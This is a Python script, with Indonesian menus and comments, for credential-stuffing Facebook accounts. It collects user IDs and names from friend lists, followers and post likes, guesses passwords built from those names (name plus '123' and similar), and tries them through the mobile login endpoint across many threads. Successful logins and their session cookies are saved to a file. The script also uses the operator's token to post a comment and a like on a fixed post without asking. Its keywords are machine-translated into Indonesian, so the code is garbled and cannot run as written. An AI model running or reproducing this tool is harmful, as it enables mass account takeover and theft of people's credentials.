#!/usr/bin/env python3
permintaan impor, waktu, os, re, json, acak
dari panel impor rich.panel
dari cetak impor kaya
dari concurrent.futures mengimpor ThreadPoolExecutor
dari rich.tree mengimpor Pohon
dari konsol impor rich.console

### DAFTAR DUMP ###
Buang = []
### BANNER ATAU LOGO ###
def banner_logo():
    os.system('cls' if os.name == 'nt' else 'clear') # Dikodekan oleh Aldy
    Console(width=50, style="bold hot_pink2").print(Panel("""[tebal merah]●[tebal kuning] ●[tebal hijau] ●
[tebal merah] █████████████████████████
██▀▄─██▄─▄███▄─▄▄▀█▄─█─▄█
██─▀─███─██▀██─██─██▄─▄██
▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▀▀▀▄▄▄▀▀
█████████████████████████████████████
█▄─▄███▄─█─▄█░▄▄░▄█▄─▄▄─█▄─▄▄▀█─▄─▄─█
██─██▀██▄─▄███▀▄█▀██─▄█▀██─▄─▄███─███
▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▀▄▄▄▀▀
[putih tebal] ▒▒▄▀▀▀▀▀▄▒▒▒▒▒▄▄▄▄▄▒▒▒
▒▐░▄░░░▄░▌▒▒▄█▄█▄█▄█▄▒
▒▐░▀▀░▀▀░▌▒▒▒▒▒░░░▒▒▒▒
▒▒▀▄░═░▄▀▒▒▒▒▒▒░░░▒▒▒▒
▒▒▐░▀▄▀░▌▒▒▒▒▒▒░░░▒▒▒▒
[bold blue] \\|[bold green]Multi Brute Force Facebook[bold blue]|/""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] Versi 8.0 [bold hijau]<[kuning tebal]<[merah tebal]<"))
    kembali 0
### DAPATKAN NAMA ###
def dapatkan_nama(cookie, token_eaag):
    dengan request.Session() sebagai r:
        r.headers.update({
            'host': 'graph.facebook.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A ;FBAV/375.1.0.28.111;]',
            'kuki': kuki
        })
        response = r.get('https://graph.facebook.com/v15.0/me/?fields=id,name&access_token={}'.format(token_eaag)).json()
        jika 'nama' di str(respon) dan 'id' di str(respon):
            kembalikan respons['nama'].title(), respons['id']
        kalau tidak:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic red]Gagal Akses Graph Facebook, Kemungkinan Cookies Facebook Sudah Kadaluarsa!", title="[bold hot_pink2]([bold blue]Token Invalid [tebal hot_pink2])"));waktu.tidur(3.2);login_cookie()
### LOGIN MENGGUNAKAN COOKIE ###
def login_cookie():
    mencoba:
        banner_logo()
        Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Login Menggunakan Cookie Facebook
[hijau tebal]2[putih tebal]. Cara Mendapatkan Cookie Facebook
[hijau tebal]3[putih tebal]. Keluar ([bold red]Logout[bold white])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[ hot_pink2] (Masuk Menggunakan Cookie) [hijau tebal]<[kuning tebal]<[merah tebal]<"))
        kueri = Console().input("[bold hot_pink2] ╰─> ")
        jika kueri == '1' atau kueri == '01':
            Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan[italic green] Cookie[italic white], Gunakan Tumbal Untuk Login Dan Pastikan Tidak Terkena[italic yellow] Checkpoint[italic putih]!", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[ kuning tebal]<[merah tebal]<"))
            cookie = Console().input("[bold hot_pink2] ╰─> ")
            dengan request.Session() sebagai r:
                r.headers.update({
                    'kuki': kuki,
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A ;FBAV/375.1.0.28.111;]',
                    'host': 'business.facebook.com'
                })
                response3 = r.get('https://business.facebook.com/business_locations').teks
                token_eaag = re.search('(EAAG\w+)', str(response3)).grup(1)
                nama, id = dapatkan_nama(cookie, token_eaag)
                Console(width=50, style="bold hot_pink2").print(Panel(f"""[bold white]Nama :[bold green] {name}
[bold white]Pengguna :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Selamat datang) [bold green]<[bold yellow] <[tebal merah]<"));bot_komen(cookie, token_eaag)
                open('Data/Cookie.json', 'w').write(json.dumps({'Cookie': cookie}));open('Data/Token.json', 'w').write(json. dumps({'Token': token_eaag}));time.sleep(3.6);daftar_menu()
        kueri elif == '2' atau kueri == '02':
            mencoba:
                Console().print("[bold hot_pink2] ╰─>[bold green] Kamu Akan Diarahkan Ke Youtube!", end='\r');time.sleep(3.6);os.system("xdg-open https ://www.youtube.com/watch?v=3Y6xsMB3wRg");keluar()
            kecuali: keluar()
        kueri elif == '3' atau kueri == '03':
            Console().print("[bold hot_pink2] ╰─>[bold yellow] Keluar Dari Tools!", end='\r');time.sleep(3.6);exit()
        kalau tidak:
            Console().print("[bold hot_pink2] ╰─>[bold red] Pilihan Tidak Retraksi!", end='\r');time.sleep(3.6);login_cookie()
    kecuali Pengecualian sebagai e:
        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[ hijau tebal]>[hot_pink2] (Kesalahan) [hijau tebal]<[kuning tebal]<[merah tebal]<"));keluar()
### BOT KOMEN ###
def bot_komen(cookie, token_eaag):
    with request.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
        teks = acak.pilihan(
            ['Keren Bang 😎', 'Hello World!', 'Mantap Bang ☺️', 'I Love You ❤️', 'Hai Bang 😘']
        )
        r.cookies.update({
            'kuki': kuki
        })
        response = r.post('https://graph.facebook.com/10160350353143544/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
        response2 = r.post('https://graph.facebook.com/10160350353143544/likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
        jika "\"id\":\"" di str(respon) dan str(response2) == 'benar':
            kembali 0
        kalau tidak:
            kembali 1
### MENU DAFTAR ###
def daftar_menu():
    mencoba:
        banner_logo();cookie = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
        token_eaag = json.loads(open('Data/Token.json', 'r').read())['Token']
        nama, id = dapatkan_nama(cookie, token_eaag)
        Console(width=50, style="bold hot_pink2").print(Panel(f"""[bold white]Nama :[bold green] {name}
[bold white]Pengguna :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Selamat datang) [bold green]<[bold yellow] <[tebal merah]<"))
    kecuali Pengecualian sebagai e:
        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[ hijau tebal]>[hot_pink2] (Kesalahan) [hijau tebal]<[kuning tebal]<[merah tebal]<"));time.sleep(3.6);login_cookie()
    Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Crack User Dari Publik Or Friends
[hijau tebal]2[putih tebal]. Crack User Dari Pengikut
[hijau tebal]3[putih tebal]. Crack User Dari Suka Produk
[hijau tebal]4[putih tebal]. Keluar ([bold red]Logout[bold white])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[ hot_pink2] (Facebook Retak) [hijau tebal]<[kuning tebal]<[merah tebal]<"))
    kueri = Console().input("[bold hot_pink2] ╰─> ")
    jika kueri == '1' atau kueri == '01':
        mencoba:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan[italic green] ID Akun Facebook[italic white], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543 ,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold kuning]<[merah tebal]<"))
            userid = Console().input("[bold hot_pink2] ╰─> ")
            untuk z di userid.split(','):
                dump().publik(int(z), cookie, unit_cursor = '')
            jika len(Buang) <50:
                Console().print("[bold hot_pink2] ╰─>[bold yellow] Jumlah Pengguna Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r ")
            kalau tidak:
                Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow ]>[tebal hijau]>[hot_pink2] (Dump Sukses) [tebal hijau]<[tebal kuning]<[tebal merah]<"));crack().open_list()
        kecuali Pengecualian sebagai e:
            Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[ hijau tebal]>[hot_pink2] (Kesalahan) [hijau tebal]<[kuning tebal]<[merah tebal]<"));keluar()
    kueri elif == '2' atau kueri == '02':
        mencoba:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan[italic green] ID Akun Facebook[italic white], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543 ,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold kuning]<[merah tebal]<"))
            userid = Console().input("[bold hot_pink2] ╰─> ")
            untuk z di userid.split(','):
                dump().pengikut(z, cookie, token_eaag)
            jika len(Buang) <50:
                Console().print("[bold hot_pink2] ╰─>[bold yellow] Jumlah Pengguna Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r ")
            kalau tidak:
                Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow ]>[tebal hijau]>[hot_pink2] (Dump Sukses) [tebal hijau]<[tebal kuning]<[tebal merah]<"));crack().open_list()
        kecuali Pengecualian sebagai e:
            Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[ hijau tebal]>[hot_pink2] (Kesalahan) [hijau tebal]<[kuning tebal]<[merah tebal]<"));keluar()
    kueri elif == '3' atau kueri == '03':
        mencoba:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan ID Postingan, Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 10160334652393544", subtitle="╭─── ", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            postid = Console().input("[bold hot_pink2] ╰─> ")
            untuk z di postid.split(','):
                dump().suka(z, cookie, token_eaag, setelah = '')
            jika len(Buang) < 1:
                Console().print("[bold hot_pink2] ╰─>[bold yellow] Jumlah Pengguna Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r ")
            kalau tidak:
                Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow ]>[tebal hijau]>[hot_pink2] (Dump Sukses) [tebal hijau]<[tebal kuning]<[tebal merah]<"));crack().open_list()
        kecuali Pengecualian sebagai e:
            Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[ hijau tebal]>[hot_pink2] (Kesalahan) [hijau tebal]<[kuning tebal]<[merah tebal]<"));keluar()
    kueri elif == '4' atau kueri == '04':
        mencoba:
            os.remove('Data/Cookie.json');os.remove('Data/Token.json');Console().print("[bold hot_pink2] ╰─>[bold green] Keluar Dari Program!", end='\r');waktu.tidur(3.6);keluar()
        kecuali: keluar()
    kalau tidak:
        Console().print("[bold hot_pink2] ╰─>[bold red] Pilihan Tidak referensi!", end='\r');time.sleep(3.6);daftar_menu()
### MEMBUANG ###
pembuangan kelas:

    def __init__(self) -> Tidak ada:
        lulus
    ### PUBLIK DUMP ###
    def publik(self, userid, cookie, unit_cursor):
        mencoba:
            dengan request.Session() sebagai r:
                r.headers.update({
                    'permintaan-peningkatan-tidak aman': '1',
                    'terima': 'teks/html,aplikasi/xhtml+xml,aplikasi/xml;q=0,9,gambar/avif,gambar/webp,gambar/apng,*/*;q=0,8,aplikasi/pertukaran bertanda tangan;v =b3;q=0,9',
                    'host': 'm.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A ;FBAV/35.0.0.48.273;]',
                    'accept-language': 'id,en;q=0.9',
                })
                r.cookies.update({
                    'kuki': kuki
                })
                response = r.get('https://m.facebook.com/profile.php?id={}&v=friends&unit_cursor={}'.format(userid, unit_cursor)).text
                self.all_friends = re.findall('href="fb://profile/(.*?)">(.*?)<', str(response))
                untuk z di self.all_friends:
                    self.id_teman, self.name = z[0], z[1].lower()
                    jika len(nama.diri) == 0 atau len(nama.diri) > 100:
                        melanjutkan
                    kalau tidak:
                        jika str(self.id_friends) di str(Dump):
                            melanjutkan
                        kalau tidak:
                            Console().print(f"[bold hot_pink2] ╰─>[bold green] Dump {self.id_friends}/{len(Dump)} Pengguna ", end='\r');time.sleep(0.0007)
                            Dump.append(f'{self.id_friends}|{self.name}')
                jika 'Maaf, terjadi kesalahan.' di str(respons):
                    Console().print(f"[bold hot_pink2] ╰─>[bold yellow] Maaf, Ada yang Salah! ", end='\r');time.sleep(2.1)
                    kembali 0
                elif 'unit_cursor=' di str(response):
                    mencoba:
                        self.unit_cursor = re.search('unit_cursor=(.*?)&', str(respons)).group(1)
                        self.publik(userid, cookie, self.unit_cursor)
                    kecuali (AttributeError):
                        Console().print(f"[bold hot_pink2] ╰─>[tebal merah] Kursor Tidak Ditemukan! ", end='\r');time.sleep(2.1)
                        kembali 2
                kalau tidak:
                    kembali 0
        kecuali (KeyboardInterrupt):
            Console().print(f"[bold hot_pink2] ╰─>[bold yellow] KeyboardInterrupt! ", end='\r');time.sleep(3.6)
            kembali 3
    ### DUMP PENGIKUT ###
    def pengikut(self, userid, cookie, token_eaag):
        mencoba:
            dengan request.Session() sebagai r:
                r.headers.update({
                    'host': 'graph.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A ;FBAV/375.1.0.28.111;]',
                    'kuki': kuki
                })
                response = r.get('https://graph.facebook.com/v1.0/{}/subscribers?access_token={}&pretty=1&fields=id%2Cname&limit=5000'.format(userid, token_eaag)).json ()
                jika 'ringkasan' di str(respon) dan 'nama' di str(respon):
                    untuk z sebagai tanggapan['data']:
                        mencoba:
                            self.id, self.name = z['id'], z['name'].lower()
                            jika str(self.id) di str(Dump):
                                melanjutkan
                            kalau tidak:
                                Console().print(f"[bold hot_pink2] ╰─>[bold green] Dump {self.id}/{len(Dump)} Pengguna ", end='\r');time.sleep(0.0007)
                                Dump.append(f'{self.id}|{self.name}')
                        kecuali (KeyError):
                            Console().print(f"[bold hot_pink2] ╰─>[bold red] KeyError! ", end='\r');time.sleep(3.6);continue
                    kembali 0
                kalau tidak:
                    Console().print(f"[bold hot_pink2] ╰─>[bold yellow] Gagal {userid} Pengguna! ", end='\r');time.sleep(3.6)
                    kembali 1
        kecuali (KeyboardInterrupt):
            Console().print(f"[bold hot_pink2] ╰─>[bold yellow] KeyboardInterrupt! ", end='\r');time.sleep(3.6)
            kembali 2
    ### DUMP SUKA ###
    def suka (self, postid, cookie, token_eaag, setelah):
        mencoba:
            dengan request.Session() sebagai r:
                r.headers.update({
                    'host': 'graph.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A ;FBAV/375.1.0.28.111;]',
                    'kuki': kuki
                })
                response = r.get('https://graph.facebook.com/v1.0/{}/likes/?access_token={}&pretty=1&limit=25&after={}'.format(postid, token_eaag, after)) .json()
                jika 'id' di str(respon) dan 'nama' di str(respon):
                    untuk z sebagai tanggapan['data']:
                        self.id, self.name = z['id'], z['name'].lower()
                        jika str(self.id) di str(Dump):
                            melanjutkan
                        kalau tidak:
                            Console().print(f"[bold hot_pink2] ╰─>[bold green] Dump {self.id}/{len(Dump)} Pengguna ", end='\r');time.sleep(0.0007)
                            Dump.append(f'{self.id}|{self.name}')
                    if '\'setelah\':' di str(respons):
                        self.likes(postid, cookie, token_eaag, after = response['paging']['cursors']['after'])
                    kalau tidak:
                        kembali 0
                kalau tidak:
                    Console().print(f"[bold hot_pink2] ╰─>[bold yellow] Gagal {postid} Pengguna! ", end='\r');time.sleep(3.6)
                    kembali 1
        kecuali (KeyboardInterrupt):
            Console().print(f"[bold hot_pink2] ╰─>[bold yellow] KeyboardInterrupt! ", end='\r');time.sleep(3.6)
            kembali 2
### RETAKAN ###
celah kelas:

    def __init__(self) -> Tidak ada:
        self.checkpoint, self.looping, self.sukses = [], 0, []
        lulus
    ### BUAT SANDI ###
    def generate_password(self, nama):
        self.password = []
        untuk nama di name.split(' '):
            jika len(nama) <= 5:
                jika len(nama) < 3:
                    melanjutkan
                kalau tidak:
                    self.password.append(nama + '123')
                    self.password.append(nama + '1234')
                    self.password.append(nama + '12345')
                    self.password.append(nama + '123456')
            kalau tidak:
                jika len(nama) < 3:
                    self.password.append(nama)
                kalau tidak:
                    self.password.append(nama)
                    self.password.append(nama + '123')
                    self.password.append(nama + '1234')
                    self.password.append(nama + '12345')
                    self.password.append(nama + '123456')
        self.password_ = []
        untuk z di self.password:
            jika str(z) di str(self.password_):
                melanjutkan
            kalau tidak:
                self.password_.append(z)
        kembalikan diri.kata sandi_
    ### BUKA LIST DUMP ###
    def open_list(self):
        mencoba:
            Console(width=50, style="bold hot_pink2").print(Panel("""[bold white]Hasil Crack[bold green] Ok[bold white] Tersimpan Di :[bold green] Results/Ok.txt
[bold white]Hasil Crack[bold red] Cp[bold white] Tersimpan Di :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[ hot_pink2] (Hasil Retak) [hijau tebal]<[kuning tebal]<[merah tebal]"))
            dengan ThreadPoolExecutor(max_workers=35) sebagai (V):
                untuk z di Dump:
                    self.email, self.nama = z.split('|')[0], z.split('|')[1]
                    self.password = self.generate_password(self.nama)
                    V.submit(self.main, Dump, self.email, self.password)
            Console().print("\r[bold putih][[bold hijau]Selesai[bold putih]] ");exit()
        kecuali: keluar()
    ### UTAMA ###
    def main(mandiri, total, email, kata sandi):
        mencoba:
            untuk pws dalam kata sandi:
                self.useragent = self.realme_useragent(total = 1)
                dengan request.Session() sebagai r:
                    r.headers.update({
                        'koneksi': 'keep-alive',
                        'accept-language': 'id,en-US;q=0.9,en;q=0.8',
                        'sec-fetch-mode': 'menavigasi',
                        'terima': 'teks/html,aplikasi/xhtml+xml,aplikasi/xml;q=0,9,gambar/avif,gambar/webp,gambar/apng,*/*;q=0,8,aplikasi/pertukaran bertanda tangan;v =b3;q=0,9',
                        'sec-fetch-sest': 'dokumen',
                        'sec-fetch-site': 'tidak ada',
                        'cache-control': 'max-age=0',
                        'sec-fetch-user': '?1',
                        'permintaan-peningkatan-tidak aman': '1',
                        'host': 'm.alpha.facebook.com',
                        'user-agent': self.useragent
                    })
                    respon = r.get('https://m.alpha.facebook.com/login.php?').teks
                    mencoba:
                        self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                        self.m_ts = re.search('name="m_ts" value="(.*?)"', str(response)).group(1)
                        self.li = re.search('name="li" value="(.*?)"', str(response)).group(1)
                        self.fb_dtsg = re.search('{"dtsg":{"token":"(.*?)"', str(response)).group(1)
                        self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                        self.__a = re.search('"encrypted":"(.*?)"', str(response)).group(1)
                        self.__spin_t = re.search('"__spin_t":(\d+),', str(response)).group(1)
                    kecuali (AttributeError) sebagai e:
                        Console().print("[bold hot_pink2] ╰─>[bold red] Gagal Menggores... ", end='\r');time.sleep(2.0);continue
                    data = {
                        'm_ts': self.m_ts,
                        'li': self.li,
                        'coba_nomor': 0,
                        'unrecognized_try': 0,
                        'email': email,
                        'prefill_contact_point': email,
                        'prefill_source': 'browser_dropdown',
                        'prefill_type': 'kata sandi',
                        'first_prefill_source': 'browser_dropdown',
                        'first_prefill_type': 'contact_point',
                        'had_cp_prefilled': Benar,
                        'had_password_prefilled': Benar,
                        'is_smart_lock': Salah,
                        'bi_xrwh': 0,
                        'encpass': '#PWD_BROWSER:0:{}:{}'.format(self.__spin_t, pws),
                        'fb_dtsg': self.fb_dtsg,
                        'jazoest': self.jazoest,
                        'lsd': self.lsd,
                        '__dyn': '',
                        '__csr': '',
                        '__req': random.pilihan(['1','2','3','4','5']),
                        '__a': diri.__a,
                        '__pengguna': 0
                    }
                    r.headers.update({
                        'cookie': ("; ".join([str(x)+"="+str(y) untuk x,y di r.cookies.get_dict().items()])),
                        'sec-fetch-site': 'asal-sama',
                        'asal': 'https://m.alpha.facebook.com',
                        'menerima': '*/*',
                        'jenis-konten': 'application/x-www-form-urlencoded',
                        'x-fb-lsd': self.lsd,
                        'perujuk': 'https://m.alpha.facebook.com/login.php?',
                        'panjang konten': str(len(("&").join([ "%s=%s" % (x, y) untuk x, y di data.items() ])))
                    })
                    response2 = r.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = data, allow_redirects = True)
                    #open('Response.txt', 'a+').write(f'{email}|{pws}|{r.cookies.get_dict()}\n')
                    jika 'c_user' di r.cookies.get_dict().keys():
                        mencoba:
                            self.cookie = (";".join([str(x)+"="+str(y) untuk x,y di r.cookies.get_dict().items()]))
                        kecuali: lulus
                        tree = Tree("\r[bold white]LOGIN SUCCESS ", style = "bold white")
                        tree.add(f"[bold green]Email : {email}").add(f"[bold green]Password : {pws}", style = "bold white")
                        tree.add(f"[bold green]Cookie : {self.cookie}", style = "tebal putih")
                        cetak (pohon)
                        self.success.append(f'{email}|{pws}|{self.cookie}')
                        open('Results/Ok.txt', 'a+').write(f'{email}|{pws}|{self.cookie}\n')
                        merusak
                    elif 'pos pemeriksaan' di r.cookies.get_dict().keys():
                        tree = Tree("\r[bold white]LOGIN CHECKPOINT ", style = "bold white")
                        tree.add(f"[bold red]Email : {email}").add(f"[bold red]Password : {pws}", style = "bold white")
                        tree.add(f"[bold red]Useragent : {self.useragent}", style = "tebal putih")
                        cetak (pohon)
                        self.checkpoint.append(f'{email}|{pws}|{self.useragent}')
                        open('Results/Cp.txt', 'a+').write(f'{email}|{pws}|{self.useragent}\n')
                        merusak
                    kalau tidak:
                        melanjutkan
            self.looping += 1
            Console().print(f"[bold hot_pink2] ╰─>[bold white] Crack {str(len(Dump))}/{self.looping} Ok:-[bold green]{len(self.success)} [putih tebal] Cp:-[tebal merah]{len(poin pemeriksaan mandiri)}[putih tebal] ", end='\r')
        kecuali (requests.exception.ConnectionError, request.exceptions.ChunkedEncodingError):
            Console().print("[bold hot_pink2] ╰─>[bold red] Koneksi Error! ", end='\r');time.sleep(7.9);self.main(total, email, password)
    ### AGEN PENGGUNA REALME ###
    def realme_useragent(self, total):
        untuk _ dalam rentang (total):
            self.browser_version = (f'{random.randrange(85, 105)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
            self.build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') untuk y dalam rentang(6)))
            self.android_version = random.choice(['11', '10'])
            self.android_model = random.choice(['RMX2052', 'RMX2072', 'RMX2075', 'RMX2071', 'RMX2076', 'RMX2144'])
            self.useragent = ('Mozilla/5.0 (Linux; Android {}; {} Build/{}; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/{} Mobile Safari/537.36'.format(self .android_version, self.android_model, self.build, self.browser_version))
        kembali self.useragent

jika __nama__ == '__main__':
    mencoba:
        os.system('git pull');daftar_menu()
    kecuali Pengecualian sebagai e:
        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[ hijau tebal]>[hot_pink2] (Kesalahan) [hijau tebal]<[kuning tebal]<[merah tebal]<"));keluar()
